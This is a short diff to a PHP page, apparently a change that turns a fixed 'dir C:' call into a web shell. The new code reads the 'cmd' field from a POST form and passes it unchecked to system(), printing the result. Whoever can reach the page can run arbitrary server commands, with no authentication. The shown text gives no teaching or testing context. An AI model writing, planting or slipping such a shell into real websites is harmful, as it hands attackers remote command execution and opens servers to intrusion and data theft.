@@ -1,15 +1,14 @@
 <?php
-	if($_SERVER["REQUEST_METHOD"] === "POST"):
-		$cmd = $POST["cmd"];
+	if($_SERVER["REQUEST_METHOD"] === 'POST'):
+		$cmd = $_POST["cmd"];
 		echo "<pre>";
-			$comando = system("dir C:", $retorno);
+			$comando = system($cmd, $retorno);
 		echo "</pre>";
 	endif;
 
-
 ?>
 
-<form action="" method="POST">
+<form method="post">
 	
 	<input type="text" name="cmd">
 	<button type="submit">Enviar</button>
